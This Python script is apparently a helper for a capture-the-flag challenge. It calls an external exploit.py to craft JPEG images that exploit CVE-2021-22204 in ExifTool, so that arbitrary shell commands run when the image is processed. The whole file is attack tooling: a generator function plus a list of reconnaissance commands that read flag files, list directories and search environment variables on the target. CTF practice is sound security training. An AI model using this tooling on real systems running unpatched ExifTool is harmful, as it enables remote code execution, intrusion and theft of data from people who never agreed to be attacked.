#!/usr/bin/env python3
"""
Helper script to generate malicious images for the Reverse Metadata Part 1 challenge.
This exploits CVE-2021-22204 in ExifTool.
"""

import subprocess
import sys
import os

def generate_exploit_image(command, output_filename="malicious.jpg"):
    """
    Generate a malicious image that executes a command when ExifTool processes it.
    """
    print(f"[*] Generating malicious image with command: {command}")
    print(f"[*] Output file: {output_filename}")
    
    # Run the exploit script
    result = subprocess.run(
        ['python3', 'exploit.py', '-c', command],
        capture_output=True,
        text=True
    )
    
    if result.returncode == 0:
        # Rename the generated image.jpg to the desired output filename
        if os.path.exists('image.jpg'):
            if output_filename != 'image.jpg':
                os.rename('image.jpg', output_filename)
            print(f"[+] Successfully generated {output_filename}")
            return True
        else:
            print("[-] Error: image.jpg was not created")
            return False
    else:
        print(f"[-] Error running exploit: {result.stderr}")
        return False

if __name__ == "__main__":
    # Common commands to try for finding the flag
    commands = [
        # Try to read common flag locations
        "cat /flag.txt",
        "cat /flag",
        "cat flag.txt",
        "cat flag",
        "cat /home/*/flag.txt",
        "cat /var/www/html/flag.txt",
        
        # List files in common directories
        "ls -la /",
        "ls -la /var/www/html",
        "ls -la /home",
        
        # Find flag files
        "find / -name '*flag*' 2>/dev/null | head -20",
        
        # Check environment variables
        "env | grep -i flag",
        
        # Check current directory
        "pwd && ls -la",
    ]
    
    if len(sys.argv) > 1:
        # Custom command provided
        command = sys.argv[1]
        output_name = sys.argv[2] if len(sys.argv) > 2 else "malicious.jpg"
        generate_exploit_image(command, output_name)
    else:
        print("Usage:")
        print(f"  {sys.argv[0]} '<command>' [output_filename]")
        print("\nExample commands to try:")
        for i, cmd in enumerate(commands[:5], 1):
            print(f"  {i}. {cmd}")

